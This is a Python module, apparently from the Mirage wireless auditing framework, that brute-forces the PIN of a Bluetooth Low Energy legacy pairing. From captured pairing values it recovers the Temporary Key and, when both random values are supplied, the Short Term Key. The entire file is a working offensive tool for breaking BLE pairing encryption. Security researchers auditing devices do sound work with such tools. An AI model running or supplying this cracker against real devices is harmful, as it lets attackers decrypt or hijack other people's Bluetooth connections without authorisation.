from mirage.libs import utils,io,ble
from mirage.core import module

class ble_crack(module.WirelessModule):
	def init(self):
		self.technology = "ble"
		self.type = "bruteforce"
		self.description = "Enumerates all possible values of PIN in order to find the Temporary Key"
		self.args = {
				"MASTER_RAND":"",
				"SLAVE_RAND":"",
				"PAIRING_REQUEST":"", 
				"PAIRING_RESPONSE":"", 
				"INITIATOR_ADDRESS":"11:22:33:44:55:66", 
				"INITIATOR_ADDRESS_TYPE":"public",
				"RESPONDER_ADDRESS":"11:22:33:44:55:66", 
				"RESPONDER_ADDRESS_TYPE":"public", 
				"MASTER_CONFIRM":"", 
				"SLAVE_CONFIRM":""
				
			}

	def checkParametersValidity(self):

		couple = (
				(self.args["MASTER_RAND"] != "" and self.args["MASTER_CONFIRM"] != "") or 
				(self.args["SLAVE_RAND"] != "" and self.args["SLAVE_CONFIRM"] != "")
			)

		addresses = (
				self.args["INITIATOR_ADDRESS"] != "" and 
				self.args["RESPONDER_ADDRESS"] != "" and 
				self.args["INITIATOR_ADDRESS_TYPE"] != "" and 
				self.args["RESPONDER_ADDRESS_TYPE"] != ""
			    )
		payloads = (self.args["PAIRING_REQUEST"] != "" and self.args["PAIRING_RESPONSE"] != "")
		return couple and addresses and payloads

	def run(self):
		if self.checkParametersValidity():
			self.mRand = bytes.fromhex(self.args["MASTER_RAND"])
			self.sRand = bytes.fromhex(self.args["SLAVE_RAND"])



			self.pReq = bytes.fromhex(self.args["PAIRING_REQUEST"])
			self.pRes = bytes.fromhex(self.args["PAIRING_RESPONSE"])
			self.initiatorAddress = utils.addressArg(self.args["INITIATOR_ADDRESS"])
			self.responderAddress = utils.addressArg(self.args["RESPONDER_ADDRESS"])
			self.initiatorAddressType = b"\x00" if self.args["INITIATOR_ADDRESS_TYPE"] == "public" else b"\x01"
			self.responderAddressType = b"\x00" if self.args["RESPONDER_ADDRESS_TYPE"] == "public" else b"\x01"

			self.mConfirm = bytes.fromhex(self.args["MASTER_CONFIRM"])
			self.sConfirm = bytes.fromhex(self.args["SLAVE_CONFIRM"])

			rand = self.mRand if self.mRand != b"" and self.mConfirm != b"" else self.sRand
			confirm = self.mConfirm if self.mRand != b"" and self.mConfirm != b"" else self.sConfirm

			

			io.info("Cracking TK ...")
			
			pin = ble.BLECrypto.crackTemporaryKey(
								rand,
								self.pReq,
								self.pRes,
								self.initiatorAddressType,
								self.initiatorAddress,
								self.responderAddressType,
								self.responderAddress,
								confirm
								)
			io.success("Pin found : "+str(pin))
			self.temporaryKey = bytes.fromhex((32-len(hex(pin)[2:]))*"0"+hex(pin)[2:])
			io.success("Temporary Key found : "+self.temporaryKey.hex())

			if self.mRand != b"" and self.sRand != b"":
				self.shortTermKey = ble.BLECrypto.s1(self.temporaryKey,self.mRand,self.sRand)[::-1]
				io.success("Short Term Key found : "+self.shortTermKey.hex())
				return self.ok({"PIN":str(pin), "TEMPORARY_KEY":self.temporaryKey.hex(),"SHORT_TERM_KEY":self.shortTermKey.hex()})
			return self.ok({"PIN":str(pin), "TEMPORARY_KEY":self.temporaryKey.hex()})
		else:
			io.fail("Missing parameters !")
			return self.nok()
